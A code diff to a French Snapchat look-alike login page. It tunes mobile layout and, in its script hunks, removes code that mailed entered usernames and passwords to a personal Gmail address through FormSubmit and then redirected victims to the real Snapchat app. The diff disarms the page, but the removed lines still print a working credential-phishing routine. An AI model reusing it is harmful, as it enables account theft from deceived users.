@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Snapchat</title>
   <style>
     @font-face {
@@ -39,6 +39,7 @@
 
     html, body {
       height: 100%;
+      min-height: 100%;
       width: 100%;
       margin: 0;
       padding: 0;
@@ -56,7 +57,10 @@
     .phone {
       width: 100%;
       height: 100vh; /* Fallback pour anciens navigateurs */
+      height: 100svh;
+      height: 100dvh;
       height: calc(var(--vh, 1vh) * 100);
+      min-height: -webkit-fill-available;
       background: #FFFC00;
       position: relative;
       overflow: hidden;
@@ -126,6 +130,7 @@
     /* ── Ghost image ── */
     .ghost-wrap {
       flex: 1;
+      min-height: 0;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -139,11 +144,11 @@
     /* ── Buttons area ── */
     .buttons-area {
       width: 100%;
-      padding: 0 24px 0;
+      padding: 0 24px clamp(36px, 7vh, 64px);
       display: flex;
       flex-direction: column;
       gap: 12px;
-      margin-bottom: 0;
+      flex-shrink: 0;
     }
 
     .social-btn {
@@ -158,7 +163,7 @@
       gap: 10px;
       font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
       font-size: 16px;
-      font-weight: 800;
+      font-weight: 500;
       color: #000;
       cursor: pointer;
       border: 1px solid rgba(0,0,0,0.12);
@@ -187,18 +192,19 @@
     /* ── Bottom buttons ── */
     .bottom-btns {
       width: 100%;
-      margin-top: auto;
+      margin-top: 0;
+      flex-shrink: 0;
     }
 
     .bottom-btn {
       width: 100%;
-      height: 64px;
+      height: 74px;
       border: none;
-      font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
-      font-size: 17px;
-      font-weight: 900;
+      font-family: 'Snapchat Avenir', 'Avenir Next', 'Avenir', sans-serif;
+      font-size: 19px;
+      font-weight: 600;
       color: #fff;
-      letter-spacing: 1.5px;
+      letter-spacing: 0.2px;
       cursor: pointer;
       transition: filter 0.15s ease;
     }
@@ -211,6 +217,17 @@
     }
     .btn-register {
       background: #00C0F0;
+      height: calc(74px + env(safe-area-inset-bottom, 0px));
+      padding-bottom: env(safe-area-inset-bottom, 0px);
+    }
+
+    @media (max-height: 700px) {
+      .ghost-img { width: 112px; height: 112px; }
+      .buttons-area { padding-bottom: 24px; }
+      .bottom-btn { height: 64px; }
+      .btn-register {
+        height: calc(64px + env(safe-area-inset-bottom, 0px));
+      }
     }
 
     /* ══════════════════════════════
@@ -386,7 +403,7 @@
       gap: 10px;
       font-family: 'Avenir Next Medium', 'Avenir Next', 'Avenir', sans-serif;
       font-size: 16px;
-      font-weight: 600;
+      font-weight: 500;
       color: #fff;
       cursor: pointer;
       margin-bottom: 12px;
@@ -726,62 +743,15 @@
     passwordIn.type = pwVisible ? 'text' : 'password';
   });
 
-  // ── Fonction envoi email via FormSubmit ──
-  const DEST_EMAIL = 'billalmechekour6@gmail.com';
-
-  async function envoyerEmail(data) {
-    try {
-      await fetch(`https://formsubmit.co/ajax/${DEST_EMAIL}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify({ ...data, _subject: '📱 Nouvelle activité Snapchat Clone' })
-      });
-    } catch (e) {}
-  }
-
-  // ── Redirection vers l'app Snapchat mobile ──
-  function ouvrirSnapchat() {
-    // Deep link → ouvre l'app si installée
-    window.location.href = 'snapchat://';
-
-    // Fallback : si app pas installée, redirige vers le store
-    setTimeout(() => {
-      const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-      const isAndroid = /Android/i.test(navigator.userAgent);
-      if (isIOS) {
-        window.location.href = 'https://apps.apple.com/app/snapchat/id447188370';
-      } else if (isAndroid) {
-        window.location.href = 'https://play.google.com/store/apps/details?id=com.snapchat.android';
-      } else {
-        window.location.href = 'https://accounts.snapchat.com/accounts/login';
-      }
-    }, 1500);
-  }
-
-  // ── CONNEXION : soumettre ──
+  // Maquette d'interface uniquement : aucune donnée n'est envoyée ni enregistrée.
   submitBtn.addEventListener('click', () => {
     if (!submitBtn.classList.contains('active')) return;
-
-    // Sauvegarder les données avant de vider les champs
-    const identifiant = usernameIn.value.trim();
-    const motDePasse  = passwordIn.value;
-
-    // Afficher uniquement le spinner
     submitBtn.innerHTML = '<span class="btn-spinner"></span>';
     submitBtn.disabled = true;
-
-    // Envoyer email en arrière-plan (sans bloquer la redirection)
-    envoyerEmail({
-      Type: '🔐 Connexion',
-      Identifiant: identifiant,
-      MotDePasse: motDePasse,
-      Date: new Date().toLocaleString('fr-FR')
-    });
-
-    // Ouvrir l'app Snapchat après 1.2s (pendant que le spinner tourne)
     setTimeout(() => {
-      ouvrirSnapchat();
-    }, 1200);
+      submitBtn.textContent = 'Connexion';
+      submitBtn.disabled = false;
+    }, 700);
   });
 
   // ── INSCRIPTION ──
@@ -805,38 +775,25 @@
     regSubmit.classList.toggle('active', regFirst.value.trim().length > 0);
   });
 
-  regSubmit.addEventListener('click', async () => {
+  regSubmit.addEventListener('click', () => {
     if (!regSubmit.classList.contains('active')) return;
-    regSubmit.textContent = '⏳ Envoi...';
+    regSubmit.textContent = 'Aperçu';
     regSubmit.disabled = true;
-
-    await envoyerEmail({
-      Type: '📝 Inscription',
-      Prénom: regFirst.value.trim(),
-      'Nom de famille': regLast.value.trim() || '(non renseigné)',
-      Date: new Date().toLocaleString('fr-FR')
-    });
-
-    regSubmit.textContent = '✓ Compte créé !';
-    regSubmit.style.background = '#34C759';
     setTimeout(() => {
-      registerPage.classList.remove('visible');
       regSubmit.textContent = 'Accepter et continuer';
-      regSubmit.style.background = '';
       regSubmit.disabled = false;
-      regFirst.value = '';
-      regLast.value = '';
-      regSubmit.classList.remove('active');
-    }, 1500);
+    }, 700);
   });
 
   // Fix universel pour la hauteur (iOS/Android/WhatsApp/Instagram)
   function setVh() {
-    let vh = window.innerHeight * 0.01;
+    const viewportHeight = window.visualViewport?.height || window.innerHeight;
+    const vh = viewportHeight * 0.01;
     document.documentElement.style.setProperty('--vh', `${vh}px`);
   }
   setVh();
   window.addEventListener('resize', setVh);
+  window.visualViewport?.addEventListener('resize', setVh);
   window.addEventListener('orientationchange', () => setTimeout(setVh, 200));
 </script>
 
